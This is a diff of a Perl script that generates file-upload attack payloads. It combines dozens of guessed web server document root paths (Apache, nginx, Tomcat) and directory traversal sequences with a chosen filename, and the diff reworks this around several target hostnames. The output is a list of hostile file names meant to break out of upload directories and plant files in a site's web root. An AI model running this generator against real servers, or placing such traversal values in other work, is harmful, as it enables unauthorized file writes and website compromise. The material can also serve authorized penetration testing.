@@ -10,9 +10,9 @@ use strict;
 # It is important to specify both short and long name of the target, as its DOC_ROOT is highly likely derived from that value.
 
 # CONFIG SECTION STARTS HERE
-my $target_short='localhost';
-my $target_long='uploadbare';
-my $filename='test.jpg';
+
+my $filename='test.html';
+my @targets=('example.org','example','EXAMPLE');
 my $auto_append_traversals=1; # if set to 1, include traversal versions of the document root payloads as well
 my $auto_append_filename=1;   # if set to 1, automatically append the specified filename to each payload
 my $auto_append_pure_traversals=1; # if set to 1, include the relative (docroot independant) traversal payloads as well (the ones to jump out from unknown upload directories located inside the document root)
@@ -47,72 +47,92 @@ my @pure_traversals=(
 './...//...//...//...//...//...//...//...//'
 );
 
-# nix only list of, if we know the underlying server platform, we can comment out irrelevant paths below
-my @brute_doc_root_prefixes=
- (
-# univeresal docroots
+# nix only list, if we know the underlying server platform, we can comment out irrelevant paths below
+
+ #univeresal docroots
+my @universal_doc_roots=(
  "/var/www",
  "/usr/local/httpd", 
+ "/usr/local/www",
+ "/usr/local/httpd/{TARGET}", 
+ "/usr/local/www/{TARGET}",
  "/srv/www", 
  "/var/www/html",
- "/var/www/$target_short", 
- "/var/www/html/$target_short",
- "/var/www/vhosts/$target_short", 
- "/var/www/virtual/$target_short", 
- "/var/www/clients/vhosts/$target_short", 
- "/var/www/clients/virtual/$target_short", 
- "/var/www/$target_long", 
- "/srv/www/$target_long", 
- "/srv/www/$target_short", 
- "/var/www/html/$target_long",
- "/var/www/vhosts/$target_long", 
- "/var/www/virtual/$target_long", 
- "/var/www/clients/vhosts/$target_long", 
- "/var/www/clients/virtual/$target_long", 
-
-# nginx docroots
- "/var/www/nginx-default", 
+ "/var/www/{TARGET}",
+ "/srv/www/{TARGET}", 
+ "/var/www/html/{TARGET}",
+ "/var/www/vhosts/{TARGET}", 
+ "/var/www/virtual/{TARGET}", 
+ "/var/www/clients/vhosts/{TARGET}", 
+ "/var/www/clients/virtual/{TARGET}"
+ );
+ 
+ # nginx docroots
+my @nginx_doc_roots=("/var/www/nginx-default");
 
 # apache docroots
+my @apache_doc_roots = (
  "/usr/local/apache", 
  "/usr/local/apache2", 
- "/usr/local/www/apache22", 
- "/usr/local/www/apache24", 
- "/usr/local/$target_short/apache/www/apache22/$target_short",
- "/usr/local/apache/www/apache22/$target_short",
- "/usr/local/$target_long/apache/www/apache22/$target_long",
- "/usr/local/apache/www/apache22/$target_long",
+  "/usr/local/apache/{TARGET}", 
+ "/usr/local/apache2/{TARGET}", 
+ "/usr/local/www/apache/{TARGET}", 
+ "/usr/local/www/apache24/{TARGET}",
+ "/usr/local/{TARGET}/apache/www/apache22/{TARGET}",
+ "/usr/local/apache/www/apache22/{TARGET}",
+ "/usr/local/{TARGET}/apache/www/apache22/{TARGET}"
+ );
 
 # tomcat docroots
- "/usr/local/tomcat/webapps/$target_short",
- "/usr/local/tomcat01/webapps/$target_short", 
- "/usr/local/tomcat02/webapps/$target_short",
- "/opt/tomcat5/$target_short",
- "/opt/tomcat6/$target_short",
- "/opt/tomcat7/$target_short",
- "/usr/local/tomcat/webapps/$target_long",
- "/usr/local/tomcat01/webapps/$target_long", 
- "/usr/local/tomcat02/webapps/$target_long",
- "/opt/tomcat5/webapps/$target_long",
- "/opt/tomcat6/webapps/$target_long",
- "/opt/tomcat7/webapps/$target_long",
+my @tomcat_doc_roots=(
+ "/usr/local/tomcat/webapps/{TARGET}",
+ "/usr/local/tomcat01/webapps/{TARGET}", 
+ "/usr/local/tomcat02/webapps/{TARGET}",
+ "/opt/tomcat5/{TARGET}",
+ "/opt/tomcat6/{TARGET}",
+ "/opt/tomcat7/{TARGET}",
+ "/opt/tomcat5/webapps/{TARGET}",
+ "/opt/tomcat6/webapps/{TARGET}",
+ "/opt/tomcat7/webapps/{TARGET}",
  "/opt/tomcat5/webapps",
  "/opt/tomcat6/webapps",
  "/opt/tomcat7/webapps",
  "/var/lib/tomcat7/webapps",
- "/var/lib/tomcat7/webapps/$target_long",
- "/var/lib/tomcat7/webapps/$target_short",
+ "/var/lib/tomcat7/webapps/{TARGET}"
  );
-
+ 
 # Suffixes used in brute force search for web server document root
-my @brute_doc_root_suffixes=("", "html", "htdocs", "httpdocs", "php", "public", "src", "site", "build", "web", "data", "sites/all", "www/build",$target_short,$target_long);
+my @brute_doc_root_suffixes=("", "html", "htdocs", "httpdocs", "php", "public", "src", "site", "build", "web", "data", "sites/all", "www/build");
+my @brute_doc_root_prefixes = (@universal_doc_roots, @nginx_doc_roots, @apache_doc_roots, @tomcat_doc_roots);
 
 # END OF THE CONFIG SECTION
 
 
 
 
-foreach my $brute_force_dir_prefix(@brute_doc_root_prefixes)
+my %target_docroots;
+
+foreach my $docroot(@brute_doc_root_prefixes)
+{
+	foreach my $target(@targets)
+	{
+		my $new_docroot=$docroot;
+		$new_docroot=~s/{TARGET}/$target/g;
+		$target_docroots{$new_docroot}=1;
+	}
+}
+
+
+foreach my $target(@targets)
+{
+	push(@brute_doc_root_suffixes,$target);
+}
+
+
+
+
+
+foreach my $brute_force_dir_prefix(keys %target_docroots)
 {
   foreach my $brute_force_dir_suffix(@brute_doc_root_suffixes)
   {
@@ -151,4 +171,7 @@ if($auto_append_pure_traversals eq 1)
 		}
 	}
 }
-print "$filename\n" if($auto_append_filename eq 1);
+if($auto_append_filename eq 1)
+{
+	print "$filename\n";
+}
